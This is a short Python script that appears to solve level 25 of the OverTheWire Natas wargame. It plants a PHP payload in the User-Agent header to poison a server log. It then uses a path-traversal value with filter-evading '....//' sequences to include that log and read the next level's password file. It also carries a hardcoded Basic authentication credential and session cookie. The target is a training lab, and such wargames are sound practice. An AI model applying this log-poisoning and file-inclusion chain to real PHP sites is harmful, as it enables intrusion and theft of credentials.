import requests

url = "http://natas25.natas.labs.overthewire.org/"

headers={
	"User-Agent":"<?php readfile(\"/etc/natas_webpass/natas26\")?>",
	"Authorization": "Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==",
	"Cookie":"PHPSESSID=brjsamictps2dt48ndrorr7o76"
}

data = {
	
	"lang":"../....//....//....//....//....//var/www/natas/natas25/logs/natas25_brjsamictps2dt48ndrorr7o76.log"
}

r = requests.post(url,headers=headers,data=data)

print r.content